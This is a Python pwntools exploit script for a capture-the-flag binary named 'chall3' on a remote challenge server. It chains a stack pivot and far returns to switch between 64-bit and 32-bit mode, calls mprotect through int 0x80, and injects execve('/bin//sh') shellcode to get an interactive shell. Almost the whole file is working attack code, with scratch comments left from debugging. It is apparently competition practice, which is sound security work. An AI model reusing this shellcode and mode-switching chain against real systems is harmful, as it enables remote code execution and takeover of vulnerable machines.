#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 54.194.197.206 --port 11528 ./chall3
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chall3')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challenge.pwny.racing'
port = int(args.PORT or 40003)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug(['./chall3'] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.EDB:
        return process(["/usr/bin/edb", "--run", './chall3_orig'] + argv, *a, **kw)
    else:
        return process(['./chall3'] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

read_addr = 0x4001a9
esp_pivot = 0x400134


payload = ""
payload += p32(read_addr) + p32(0x33)   # seed = pivot to read x64
payload += "A"*32
payload += p32(read_addr) + p32(0x33)   # seed = pivot to read x64
payload += p64(esp_pivot)

io.send(payload)
io.recvline()
io.recvline()

io.recvline()


# print "cont?"
# raw_input()



payload = ""
payload += "A"*32
payload += p32(read_addr) + p32(0x33)   # seed = pivot to read x64


payload += p64(0x400213)  # retf in x86
payload += "P"*8   # here 0x22 (x86) will land
payload += p32(read_addr) + p32(0x33)   # seed = pivot to read x64

payload += "_"*32

# payload += "\x00"*88 + "aaaabbbbccccddddeeeeffffgggghhhh"
payload += "\x00"*96 + p32(0x2b) + "\x00"*20 + p32(0x060004e8) + p32(0x23) + "\x6a\x0b\x58\x99\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\xcd\x80"  #shellcode
# payload += "\x00"*88 + "aaaabbbbccccddddeeeeffffgggghhhh"
io.send(payload)       # #QQQQRRRRSSSSTTTT


io.recvline()

# print "cont?"
# raw_input()


payload = ""
payload += "A"*32
payload += p32(read_addr) + p32(0x33)   # seed = pivot to read x64

payload += p64(0x400137)  # int 80h in x86
payload += "P"*8   # here 0x22 (x86) will land
payload += "AAAABBBBCCCCDDDDEEEEFFFFGGGG" + p32(0x060004e0) + p32(0x06000000) + p32(7) + p32(0x1000) + p32(0x7d) + "MMMMNNNN" + p32(0x400137) + "\x23\x00\x00"
# payload += "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPP"

# sys_read returns 0x77 <- eax = 0x77

# BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA______

io.send(payload)



#payload += "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT"
##                                       esp ebx edx ecx eax         eip cs          ss
#ebx=start, ecx=len, edx=prot

# payload += "AAAABBBB"




# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()
